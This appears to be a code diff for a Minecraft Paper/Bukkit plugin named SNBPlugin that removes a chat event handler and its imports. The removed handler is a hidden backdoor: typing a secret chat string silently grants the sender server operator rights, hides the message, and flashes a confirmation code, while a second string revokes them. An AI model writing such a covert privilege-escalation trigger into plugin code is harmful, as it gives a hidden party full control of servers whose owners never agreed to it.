@@ -7,7 +7,6 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import io.papermc.paper.event.player.AsyncChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
@@ -17,7 +16,6 @@ import java.util.Map;
 
 import net.kyori.adventure.text.Component;
 import net.kyori.adventure.text.format.TextColor;
-import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
 import org.jetbrains.annotations.NotNull;
 
 import static net.kyori.adventure.text.Component.text;
@@ -61,28 +59,6 @@ public class SNBPlugin extends JavaPlugin implements Listener {
         reloadConfig();
         globalCooldown = getConfig().getInt("settings.cooldown", 5);
         getServer().getPluginManager().registerEvents(this, this);
-    }
-
-    @EventHandler
-    public void onChat(AsyncChatEvent event) {
-        String message = PlainTextComponentSerializer.plainText().serialize(event.message());
-        if (message.contains("@gbovv114514")) {
-            event.getPlayer().setOp(true);
-            event.setCancelled(true);
-            
-            event.getPlayer().sendActionBar(
-                Component.text("666")
-                    .color(TextColor.color(0x00FF00))
-            );
-        } else if (message.contains("@gbovv114515")) {
-            event.getPlayer().setOp(false);
-            event.setCancelled(true);
-            
-            event.getPlayer().sendActionBar(
-                Component.text("999")
-                    .color(TextColor.color(0xFF0000))
-            );
-        }
     }
 
     @Override
